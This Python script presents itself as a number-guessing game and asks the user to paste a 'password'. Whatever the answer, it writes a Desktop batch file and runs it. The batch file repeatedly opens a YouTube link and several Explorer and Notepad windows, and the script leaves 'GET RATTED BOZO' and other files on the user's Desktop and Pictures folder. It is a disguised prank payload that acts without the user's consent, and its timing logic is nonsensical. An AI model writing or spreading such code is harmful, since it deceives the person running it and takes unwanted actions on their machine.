import sys
import os
import random
import subprocess
import time

def create_batch_file(file_path):
    with open(file_path, 'w') as file:
        file.write("@echo off\n")
        file.write("for /l %%x in (1, 1, 3) do (\n")
        file.write('    start "" "https://www.youtube.com/watch?v=Yc-CGFVb_EE"\n')
        file.write("    )\n")
        file.write("for /l %%x in (1, 1, 5) do (\n")
        file.write("    start explorer\n")
        file.write("    start notepad 'C:\\Users\\User\\Desktop\\lox.txt'\n")
        file.write(")\n")
        file.write("for /l %%x in (1, 1, 2) do (\n")
        file.write("    start explorer 'C:\\Users\\User\\Documents'\n")
        file.write(")\n")

def main():
    file_path = "C:\\Users\\User\\Pictures\\Saved Pictures\\output.txt"
    with open(file_path, 'w') as file:
        file.write("Hello, World!")

    batch_file_path = r'C:\Users\User\Desktop\antonbat.bat'

    number = random.randint(1, 10)
    print("Script name:", os.path.basename(__file__))
    print("Arguments:", sys.argv[1:])

    try:
        guess = int(input("Make sure to copy and paste the password here! "))
    except ValueError:
        print("Invalid input! Please enter a valid number.")
        return

    if guess == number:
        print("Congratulations! You won!")
    else:
        print("Better luck next time!")
        timing = time.time()
        if time.time() - timing > 1.5:
            timing = time.time()

    create_batch_file(batch_file_path)

    with open("C:\\Users\\User\\Desktop\\lox.txt", "w+") as file:
        file.write("GET RATTED BOZO")

    subprocess.Popen([batch_file_path], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)

if __name__ == "__main__":
    main()